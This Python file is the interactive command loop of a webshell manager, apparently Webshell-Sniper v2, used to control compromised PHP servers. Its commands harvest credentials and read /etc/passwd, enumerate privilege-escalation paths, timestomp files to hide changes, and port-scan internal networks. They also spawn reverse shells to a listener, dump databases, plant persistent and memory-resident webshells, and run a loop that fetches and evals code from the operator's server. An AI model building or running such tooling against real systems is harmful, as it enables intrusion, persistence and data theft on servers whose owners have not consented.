"""Interactive command loop, built on :mod:`cmd2`.

cmd2 gives us persistent history, tab-completion and ``help`` for free —
replacing v1's hand-rolled ``while True: raw_input()`` dispatcher.  Command
names mirror the v1 shortcuts (``p``, ``pv``, ``fwd`` ...) so muscle memory
carries over.
"""

from __future__ import annotations

import contextlib
import importlib.metadata
import shlex
import subprocess
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from pathlib import Path

import cmd2

from . import log
from .config import Config
from .core.webshell import WebShell
from .exceptions import WebshellError
from .features import database, enum, files, inject, portscan, recon, revshell
from .utils.network import get_ip_address

BANNER = r"""
===================================================
           ____        _
          / ___| _ __ (_)_ __   ___ _ __
          \___ \| '_ \| | '_ \ / _ \ '__|
           ___) | | | | | |_) |  __/ |
          |____/|_| |_|_| .__/ \___|_|
                      |_|
===================================================
|     WebShell Manager Via Terminal (v2.0.0)      |
|  https://github.com/WangYihang/Webshell-Sniper  |
===================================================
"""


class Repl(cmd2.Cmd):
    prompt = "sniper => "

    def __init__(self, webshells: list[WebShell], config: Config):
        super().__init__(allow_cli_args=False)
        self.webshells = webshells
        self.config = config
        self.local_exec = True
        self.cwd = ""  # client-tracked remote working directory
        self.intro = BANNER
        for name in ("edit", "macro", "run_pyscript", "run_script", "shortcuts"):
            self.hidden_commands.append(name)
        # Long-form aliases mirroring v1's command names.
        self.aliases.update(
            {"print": "p", "read": "r", "quit": "q", "exit": "q", "h": "help"}
        )
        self._load_plugins()

    def _load_plugins(self) -> None:
        """Register third-party command sets from the ``webshell_sniper.commands``
        entry-point group (see docs/plugins.md). Failures are non-fatal."""
        for entry in importlib.metadata.entry_points(group="webshell_sniper.commands"):
            try:
                self.register_command_set(entry.load()())
                log.info(f"Loaded plugin: {entry.name}")
            except Exception as exc:  # noqa: BLE001 - a bad plugin must not crash startup
                log.warning(f"Plugin {entry.name!r} failed to load: {exc}")

    # -- helpers ---------------------------------------------------------------
    def _each(self, action, label: str) -> None:
        """Run ``action(ws)`` against every live webshell, isolating failures.

        Runs concurrently when ``--workers`` > 1 and there's more than one shell.
        """
        def run(ws: WebShell) -> None:
            log.info(f"[{label}] {ws}")
            try:
                action(ws)
            except WebshellError as exc:
                log.error(f"{label} failed: {exc}")

        if self.config.workers > 1 and len(self.webshells) > 1:
            with ThreadPoolExecutor(max_workers=self.config.workers) as pool:
                list(pool.map(run, self.webshells))
        else:
            for ws in self.webshells:
                run(ws)

    @staticmethod
    def _ask(prompt: str, default: str) -> str:
        return input(f"{prompt} ({default}): ").strip() or default

    # -- recon / info ----------------------------------------------------------
    def do_p(self, _: cmd2.Statement) -> None:
        """Print target info (URL, webroot, PHP & kernel version)."""
        for ws in self.webshells:
            log.success("=" * 40)
            log.success(f"URL           : {ws.url}")
            log.success(f"Method        : {ws.method}")
            log.success(f"Document root : {ws.webroot}")
            log.success(f"PHP version   : {ws.php_version}")
            log.success(f"Kernel        : {ws.kernel_version}")

    def do_pv(self, _: cmd2.Statement) -> None:
        """Show the PHP version."""
        self._each(lambda ws: log.success(ws.php_version), "php-version")

    def do_kv(self, _: cmd2.Statement) -> None:
        """Show the kernel version (uname -a)."""
        self._each(lambda ws: log.success(ws.kernel_version), "kernel-version")

    def do_c(self, _: cmd2.Statement) -> None:
        """Search the webroot for config/database files."""
        self._each(recon.find_config_files, "config")

    def do_fwd(self, _: cmd2.Statement) -> None:
        """Find writable directories under the webroot."""
        self._each(recon.find_writable_dirs, "writable-dirs")

    def do_fwpf(self, _: cmd2.Statement) -> None:
        """Find writable .php files under the webroot."""
        self._each(recon.find_writable_php, "writable-php")

    def do_gdf(self, _: cmd2.Statement) -> None:
        """List PHP disabled_functions on the target."""
        self._each(recon.get_disabled_functions, "disabled-funcs")

    def do_fsb(self, _: cmd2.Statement) -> None:
        """Find SUID-root binaries."""
        self._each(recon.find_suid_binaries, "suid")

    def do_enum(self, _: cmd2.Statement) -> None:
        """Aggregate privesc enumeration (id/sudo/cron/caps/world-writable/...)."""
        def run(ws: WebShell) -> None:
            for label, output in enum.enumerate_target(ws).items():
                if output:
                    log.success(f"== {label} ==")
                    log.raw(output)
        self._each(run, "enum")

    def do_creds(self, _: cmd2.Statement) -> None:
        """Harvest credential files and DB creds from discovered config files."""
        def run(ws: WebShell) -> None:
            configs = recon.find_config_files(ws)
            found = enum.harvest_credentials(ws, configs)
            if not found:
                log.warning("No credentials found.")
            for path, content in found.items():
                log.success(f"== {path} ==")
                log.raw(content)
        self._each(run, "creds")

    def do_r(self, line: cmd2.Statement) -> None:
        """read <path> — read a remote file (default /etc/passwd)."""
        path = str(line).strip() or self._ask("File path", "/etc/passwd")
        self._each(lambda ws: files.read_file(ws, path), "read")

    def do_ls(self, line: cmd2.Statement) -> None:
        """ls [path] — list a remote directory (mode/size/mtime/name)."""
        path = str(line).strip() or self.cwd or "."
        for ws in self.webshells:
            log.info(f"[ls] {ws}: {path}")
            try:
                rows = [
                    [f"{e['type']}{e['mode']}", e["size"],
                     datetime.fromtimestamp(e["mtime"]).strftime("%Y-%m-%d %H:%M"), e["name"]]
                    for e in files.list_dir(ws, path)
                ]
            except WebshellError as exc:
                log.error(f"ls failed: {exc}")
                continue
            log.table(["mode", "size", "mtime", "name"], rows)

    def do_mv(self, line: cmd2.Statement) -> None:
        """mv <src> <dst> — move/rename a remote file."""
        self._two_arg(line, files.move, "mv")

    def do_cp(self, line: cmd2.Statement) -> None:
        """cp <src> <dst> — copy a remote file."""
        self._two_arg(line, files.copy_file, "cp")

    def do_mkdir(self, line: cmd2.Statement) -> None:
        """mkdir <path> — create a remote directory (recursive)."""
        path = str(line).strip()
        if path:
            self._each(lambda ws: log.success(f"mkdir: {files.make_dir(ws, path)}"), "mkdir")

    def do_chmod(self, line: cmd2.Statement) -> None:
        """chmod <mode> <path> — chmod a remote file (octal, e.g. 755)."""
        parts = str(line).split()
        if len(parts) != 2:
            log.error("usage: chmod <mode> <path>")
            return
        mode, path = parts
        self._each(lambda ws: log.success(f"chmod: {files.chmod_path(ws, path, mode)}"), "chmod")

    def do_timestomp(self, line: cmd2.Statement) -> None:
        """timestomp <path> <reference> — copy reference's timestamps onto path."""
        parts = str(line).split()
        if len(parts) != 2:
            log.error("usage: timestomp <path> <reference>")
            return
        path, reference = parts
        self._each(lambda ws: files.timestomp(ws, path, reference), "timestomp")

    def do_edit(self, line: cmd2.Statement | str) -> None:
        """edit <path> — download, open in $EDITOR, upload back."""
        import os
        import tempfile

        path = str(line).strip()
        if not path:
            log.error("usage: edit <remote-path>")
            return
        ws = self.webshells[0]
        try:
            data = files.read_bytes(ws, path)
        except WebshellError as exc:
            log.error(f"edit: cannot read {path}: {exc}")
            return
        with tempfile.NamedTemporaryFile(suffix=f"-{Path(path).name}", delete=False) as handle:
            handle.write(data)
            tmp = handle.name
        try:
            subprocess.run([os.environ.get("EDITOR", "vi"), tmp])  # noqa: S603
            files.upload(ws, tmp, path)
        finally:
            os.unlink(tmp)

    def _two_arg(self, line: cmd2.Statement, fn, label: str) -> None:
        parts = str(line).split()
        if len(parts) != 2:
            log.error(f"usage: {label} <src> <dst>")
            return
        src, dst = parts
        self._each(lambda ws: log.success(f"{label}: {fn(ws, src, dst)}"), label)

    def do_rm(self, line: cmd2.Statement) -> None:
        """rm [path] — delete a remote file; with no path the shell deletes itself."""
        path = str(line).strip() or None
        if path is None:
            confirm = input("Delete the webshell ITSELF (you lose access)? [y/N]: ")
            if confirm.strip().lower() != "y":
                log.info("Aborted.")
                return
        self._each(lambda ws: files.remove(ws, path), "remove")

    # -- transfers -------------------------------------------------------------
    def do_dl(self, line: cmd2.Statement) -> None:
        """dl <path> — download a remote file or directory tree."""
        for ws in self.webshells:
            path = str(line).strip() or self._ask("Remote path", ws.webroot)
            log.info(f"[download] {ws}")
            try:
                if files.is_directory(ws, path):
                    name_filter = self._ask("Name filter", "*.php")
                    files.download_tree(ws, path, name_filter, output_dir=self.config.output_dir)
                else:
                    files.download(ws, path, self.config.output_dir)
            except WebshellError as exc:
                log.error(f"download failed: {exc}")

    def complete_ul(self, text: str, line: str, begidx: int, endidx: int):  # noqa: ANN201
        """Tab-complete the local filesystem path argument of `ul`."""
        return self.path_complete(text, line, begidx, endidx)

    def do_ul(self, line: cmd2.Statement) -> None:
        """ul <local-path> — upload a local file to the target(s)."""
        local = str(line).strip() or input("Local path: ").strip()
        if not local or not Path(local).is_file():
            log.error("Local file not found.")
            return
        for ws in self.webshells:
            remote = self._ask(f"Remote path on {ws.url}", f"{ws.webroot}/{Path(local).name}")
            log.info(f"[upload] {ws}")
            try:
                files.upload(ws, local, remote)
            except WebshellError as exc:
                log.error(f"upload failed: {exc}")

    def do_dla(self, _: cmd2.Statement) -> None:
        """Download a tree using custom `find` arguments (e.g. -size -500k)."""
        for ws in self.webshells:
            path = self._ask("Root path", ws.webroot)
            args = self._ask("find args", "-size -500k")
            log.info(f"[download-advanced] {ws}")
            try:
                files.download_tree(ws, path, find_args=args, output_dir=self.config.output_dir)
            except WebshellError as exc:
                log.error(f"download failed: {exc}")

    # -- pivots / shells -------------------------------------------------------
    def do_ps(self, _: cmd2.Statement) -> None:
        """Port-scan a CIDR range from the target (optionally grabbing banners)."""
        hosts = self._ask("Hosts (CIDR)", "192.168.1.0/24")
        ports = self._ask("Ports", "21,22,80,443,445,3306,3389")
        banner = input("Grab banners? [y/N]: ").strip().lower() == "y"
        self._each(lambda ws: portscan.port_scan(ws, hosts, ports, banner), "portscan")

    def do_rsh(self, _: cmd2.Statement) -> None:
        """Spawn a reverse shell back to you (auto/socat/nc/bash/python/perl/php)."""
        ip = self._ask("Listener IP", get_ip_address())
        port = int(self._ask("Listener port", "8888"))
        method = self._ask("Method", "auto")
        if input("Spawn a local listener here first? [y/N]: ").strip().lower() == "y":
            tool = self._ask("Listener tool (nc/socat)", "nc")
            revshell.reverse_shell_with_listener(self.webshells[0], ip, port, method, tool)
        else:
            log.info(f"Start your listener first, e.g.: nc -lvnp {port}")
            self._each(lambda ws: revshell.reverse_shell(ws, ip, port, method), "revshell")

    def do_db(self, _: cmd2.Statement) -> None:
        """Open the database manager (MySQL or PostgreSQL) via the webshell."""
        engine = self._ask("Engine (mysql/pgsql)", "mysql")
        host = self._ask("Host", "127.0.0.1")
        user = self._ask("Username", "root")
        password = self._ask("Password", "root")
        db = self._ask("Database (blank = default)", "") if engine == "pgsql" else ""
        for ws in self.webshells:
            log.info(f"[database:{engine}] {ws}")
            try:
                client = database.make_client(engine, ws, host, user, password, db)
            except ValueError as exc:
                log.error(str(exc))
                return
            if client.check_connection():
                log.success("Connected.")
                self._database_repl(client)

    def _database_repl(self, client: database.SqlClient) -> None:
        help_text = (
            "  d=databases/schemas  t=tables  c=columns  dump=dump-table  "
            "u=user  v=version  ns=current  e=exec-sql  q=quit"
        )
        log.info(help_text)
        while True:
            cmd = input("sniper(db) => ").strip().lower()
            try:
                if cmd in ("q", "quit", "exit"):
                    break
                elif cmd == "h":
                    log.info(help_text)
                elif cmd == "d":
                    log.table(["Database/Schema"], [[d] for d in client.databases()])
                elif cmd == "u":
                    log.success(client.current_user())
                elif cmd == "v":
                    log.success(client.version())
                elif cmd == "ns":
                    log.success(client.current_namespace())
                elif cmd == "t":
                    schema = self._ask("Schema", client.current_namespace())
                    log.table(["Table"], [[t] for t in client.tables(schema)])
                elif cmd == "c":
                    schema = self._ask("Schema", client.current_namespace())
                    table = input("Table: ").strip()
                    log.table(["Column"], [[col] for col in client.columns(schema, table)])
                elif cmd == "dump":
                    schema = self._ask("Schema", client.current_namespace())
                    table = input("Table: ").strip()
                    limit = int(self._ask("Limit", "50"))
                    cols, rows = client.dump(schema, table, limit)
                    if rows:
                        log.table(cols or [f"col{i}" for i in range(len(rows[0]))], rows)
                    else:
                        log.warning("No rows.")
                elif cmd == "e":
                    sql = input("SQL: ").strip()
                    rows = client.query(sql)
                    if rows:
                        log.table([f"col{i}" for i in range(len(rows[0]))], rows)
                    else:
                        log.warning("No rows.")
                else:
                    log.warning(help_text)
            except WebshellError as exc:
                log.error(str(exc))

    # -- injection -------------------------------------------------------------
    def do_aiw(self, _: cmd2.Statement) -> None:
        """Auto-inject a plain webshell (blank password = random per directory)."""
        password = input("New password (blank = random per directory): ").strip() or None
        self._each(
            lambda ws: inject.inject_webshell(
                ws, password, recon.find_writable_dirs(ws), output_dir=self.config.output_dir
            ),
            "inject",
        )

    def do_aimw(self, _: cmd2.Statement) -> None:
        """Auto-inject a memory-resident webshell (blank password = random)."""
        password = input("New password (blank = random per directory): ").strip() or None
        self._each(
            lambda ws: inject.inject_memory_webshell(
                ws, password, recon.find_writable_dirs(ws), output_dir=self.config.output_dir
            ),
            "inject-memory",
        )

    def do_fr(self, _: cmd2.Statement) -> None:
        """Flag reaper (CTF): loop pulling+eval'ing code from your server."""
        host = self._ask("Your web server IP", get_ip_address())
        port = self._ask("Your web server port", "80")
        code_url = f"http://{host}:{port}/code.txt"
        self._each(
            lambda ws: inject.flag_reaper(ws, code_url, recon.find_writable_dirs(ws)),
            "flag-reaper",
        )

    # -- exec mode -------------------------------------------------------------
    def _remote_command(self, ws: WebShell, command: str) -> str:
        """Run a command on the target, honouring the client-tracked cwd."""
        if self.cwd:
            command = f"cd {shlex.quote(self.cwd)} 2>/dev/null; {command}"
        return ws.run_command(command)

    def do_setl(self, _: cmd2.Statement) -> None:
        """Run unrecognised input on the LOCAL machine."""
        self.local_exec = True
        log.info("Unrecognised commands now run on localhost.")

    def do_setr(self, _: cmd2.Statement) -> None:
        """Run unrecognised input on the REMOTE target."""
        self.local_exec = False
        log.info("Unrecognised commands now run on the target.")

    def do_pwd(self, _: cmd2.Statement) -> None:
        """Show the client-tracked remote working directory."""
        log.success(self.cwd or "(server default)")

    def do_cd(self, line: cmd2.Statement | str) -> None:
        """cd <path> — change the (client-tracked) remote working directory."""
        arg = str(line).strip() or "."
        ws = self.webshells[0]
        base = self.cwd or ws.webroot
        target = arg if arg.startswith("/") else f"{base}/{arg}"
        try:
            resolved = ws.run_command(f"cd {shlex.quote(target)} && pwd").strip()
        except WebshellError as exc:
            log.error(f"cd failed: {exc}")
            return
        if resolved.startswith("/"):
            self.cwd = resolved
            log.success(f"cwd: {self.cwd}")
        else:
            log.error(f"cannot cd to {target}: {resolved or 'no such directory'}")

    def do_shell(self, _: cmd2.Statement | str) -> None:
        """Interactive pseudo-shell on the target(s); `exit` to return."""
        log.info("Interactive shell (cwd is client-tracked). Type `exit` to leave.")
        while True:
            try:
                line = input(f"sniper:{self.cwd or '~'}$ ").strip()
            except EOFError:
                break
            if line in ("exit", "quit"):
                break
            if not line:
                continue
            if line == "cd" or line.startswith("cd "):
                self.do_cd(line[2:].strip())
                continue
            self._each(lambda ws, cmd=line: log.raw(self._remote_command(ws, cmd)), "shell")

    def do_exec(self, line: cmd2.Statement) -> None:
        """exec <cmd> — explicitly run a command on the target."""
        command = str(line).strip()
        if command:
            self._each(lambda ws: log.raw(self._remote_command(ws, command)), "exec")

    def default(self, statement: cmd2.Statement) -> None:
        command = statement.raw.strip()
        if not command:
            return
        if self.local_exec:
            log.info(f"[local] {command}")
            subprocess.run(command, shell=True)  # noqa: S602 - intentional local exec
        else:
            self._each(lambda ws: log.raw(self._remote_command(ws, command)), "remote")

    # -- lifecycle -------------------------------------------------------------
    def do_q(self, _: cmd2.Statement) -> bool:
        """Quit (saving the live webshells to a timestamped JSON file)."""
        self._save()
        return True

    def _save(self) -> None:
        import json

        out = self.config.output_dir / f"webshells_{int(time.time())}.json"
        data = [ws.info.to_dict() for ws in self.webshells]
        out.write_text(json.dumps(data, indent=2))
        log.info(f"Saved {len(data)} webshell(s) to {out}")


# Group commands in `help` output (best-effort; tolerate cmd2 API differences).
with contextlib.suppress(Exception):
    cmd2.categorize(
        [Repl.do_p, Repl.do_pv, Repl.do_kv, Repl.do_c, Repl.do_fwd,
         Repl.do_fwpf, Repl.do_gdf, Repl.do_fsb, Repl.do_enum, Repl.do_creds],
        "Recon",
    )
    cmd2.categorize(
        [Repl.do_r, Repl.do_rm, Repl.do_dl, Repl.do_dla, Repl.do_ul, Repl.do_ls,
         Repl.do_mv, Repl.do_cp, Repl.do_mkdir, Repl.do_chmod, Repl.do_timestomp, Repl.do_edit],
        "Files",
    )
    cmd2.categorize([Repl.do_ps, Repl.do_rsh, Repl.do_db], "Pivot")
    cmd2.categorize([Repl.do_aiw, Repl.do_aimw, Repl.do_fr], "Inject")
    cmd2.categorize(
        [Repl.do_shell, Repl.do_cd, Repl.do_pwd, Repl.do_exec, Repl.do_setl, Repl.do_setr],
        "Shell / exec",
    )
